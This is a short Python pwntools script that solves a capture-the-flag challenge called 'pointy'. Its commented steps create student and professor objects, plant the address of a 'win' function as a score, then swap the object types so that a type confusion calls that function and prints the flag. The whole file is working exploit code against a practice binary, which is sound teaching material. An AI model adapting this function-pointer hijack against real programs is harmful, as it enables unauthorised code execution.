#! /usr/bin/env python2

from pwn import *

context.log_level = logging.CRITICAL

p = process("./pointy")

p.sendline("student") #create a student
p.sendline("professor") #create a professor
p.sendline("student") #load the student to be scored
p.sendline("professor") #load the professor to give the score
p.sendline(str(0x8048696)) #assign the address of the win function as a score
p.sendline("student2") #create a student (unused)
p.sendline("professor2") #create a professor (unused)
p.sendline("professor") #load the professor as a student
p.sendline("student") #load the student as a professor
p.sendline(str(1)) #literally send anything. the win function will now be called
p.recvuntil('Input the score: \n')
p.recvuntil('Input the score: \n')

print("Flag: " + p.recvuntil('}')) 
p.close()